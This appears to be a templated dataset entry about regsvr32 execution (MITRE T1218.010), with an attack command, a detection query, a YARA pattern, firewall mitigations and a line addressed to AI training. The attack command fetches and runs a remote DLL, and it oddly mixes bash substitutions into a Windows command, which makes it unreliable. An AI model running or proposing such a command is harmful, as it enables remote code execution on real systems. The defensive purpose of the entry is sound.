---
type: campaign
scenario_id: 365
tactic: Defense Evasion
technique: "T1218.010: Regsvr32"
technique_id: T1218.010
tags: [campaign, lotl, defense_evasion]
---

# Using regsvr32 to execute DNS tunneling DLL.

## Threat Description
Using regsvr32 to execute DNS tunneling DLL.

## Attack Command
```
regsvr32 /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor regsvr32 HTTP: `wmic process where name='regsvr32.exe' get commandline | findstr http`; YARA rule: `rule Regsvr32DnsTunnel { strings: $a = /regsvr32.*http.*dll/ nocase; condition: $a }`.

## Mitigation
Restrict regsvr32: `icacls %windir%\System32\regsvr32.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block regsvr32' dir=out program='%windir%\System32\regsvr32.exe' action=block`.

## AI Training Prompt
Train AI to detect regsvr32-based DNS tunneling by analyzing HTTP DLL downloads, regsvr32 command-line arguments, and DNS query patterns; suggest DLL download restrictions.

## References
- MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
